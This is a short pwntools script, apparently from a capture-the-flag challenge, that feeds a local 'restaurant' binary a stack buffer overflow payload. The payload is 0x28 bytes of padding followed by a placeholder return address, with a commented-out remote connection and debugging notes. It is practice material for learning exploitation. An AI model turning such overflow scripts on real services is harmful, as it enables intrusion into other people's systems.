from pwn import *
context.clear(arch='amd64')

ip, port = "127.0.0.1",1234
io = process('./restaurant')
#io = remote(ip, port)

io.recvuntil('>')
io.sendline('1')
io.recvuntil('>')

padding = 'A'*(0x20+0x08)

addr = 'B'*8

payload = padding+addr
io.sendline(payload)
io.recv()
#gdb.attach(io)
#gdb ./restaurant core
